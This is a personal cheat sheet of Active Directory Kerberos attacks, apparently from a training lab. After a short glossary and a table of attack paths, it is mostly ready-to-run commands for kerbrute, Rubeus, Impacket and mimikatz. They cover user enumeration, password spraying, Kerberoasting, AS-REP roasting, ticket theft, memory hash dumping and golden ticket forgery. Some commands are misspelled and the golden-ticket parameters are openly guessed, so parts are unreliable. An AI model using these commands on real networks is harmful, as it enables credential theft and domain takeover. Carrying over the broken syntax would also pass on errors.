#### Common Terms
- **Ticket Granting Ticket(TGT)** = authentication ticket used to request service tickets from the TGS for specific resources
- **Ticket Granting Service(TGS)** = Takes the TGT and returns a ticket to a machine
- **Key Distribution Center(KDC)** = Serivce for issues TGTs and service tickets
- **Authentication Service(AS)** = Issues TGTs to be used by the TGS in the domain
- **Service Principal Name(SPN)** = Identifier for a service instance to associate a service with a domain service account so they may authenticate to access domain resources.
- **KDC Long Term Secret Key(KDC LT Key)** = The KDC key is based on the KRBTGT service account.  It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** = The client key is based on the computer or service account.  It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** = Service key is based on the service account.  It is used to encrypt the service portion of the service ticket and sing the PAC.
- **Session Key** = Issued by the KDC when a TGT is ussed.  User provides the Session Key + TGT to the KDC when requesting a service ticket
- **Privilege Attribute Certificate(PAC)** = The PAC holds all of the user's relevant information.  PAC + TGT to the KDC to be signed by the Target LT key and the KDC LT Key in order to validate the user


 | Attack Paths | Perms Required |
|    :---:	| :---: |
|Kerbrute Enum | No Domain Access |
| Pass the Ticket | Access to any AD user|
|Kerberoasting | Access as any user|
| AS-REP Roasting | Access as any user|
|Golden Ticket | Domain Admin |
|Silver Ticket | Service hash |
|Skeleton Key | Domain admin|

#### Kerbrute
Kerbrute - Bruteforce usernames or enumerate them

```
Remember to add the domain to hosts file!!

Userenum:
kerbrute --dc IP -d DOMAIN.local userenum /path/to/wordlist

Pass spray:
kerbrute --dc IP -d DOMAIN.local users.txt Password123

Brute force a single user:
kerbrute --dc IP -d DOMAIN.local bruteuser /path/to/passwords username

True Bruteforce;
kerbrute --dc IP -d DOMAIN.local userpasscombo.txt

userpasscombo = needs a combined list in the format username:password
```

#### Rubeus 
Rubeus - Gather tickets that are being transfered to the KDC.  Bruteforce user accounts.  Ticket forgery. Ticket management.

```
Local tool

Syntax to gather tickets:
rebeus.exe harvest /interval:30

Syntax to bruteforce local users:
Rubeus.exe brute /password:Password1 /noticket

Syntax for roasting:
Rubeus.exe kerberoast

AS-REP Roasting:
Rubeus.exe asreproast /format:hashcat

```

#### Impacket
Impacket - Tool suite for performing backflips

```
Kerberoast syntax:
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.70.60 -request

AS-REP Roast:
python GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile out.cat -no-pass

SECRETS DUMP OP AS FUCK

```

#### mimikatz
Mimikatz - pump and dump tool

```
mimikatz cheatsheet

priv check:
privilege::debug

export all tickets:
sekurlsa::tickets /export

Pass a ticket:
kerberos::ptt <ticketfile>

Verify with:
klist


Get hash from memory:
lsadump::lsa /inject /name:<user>


GOLDEN ticket:
kerbos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<hash> /id:<id>

sid=domain controller?
krbtgt=hash for user
id=500? lmao idk





```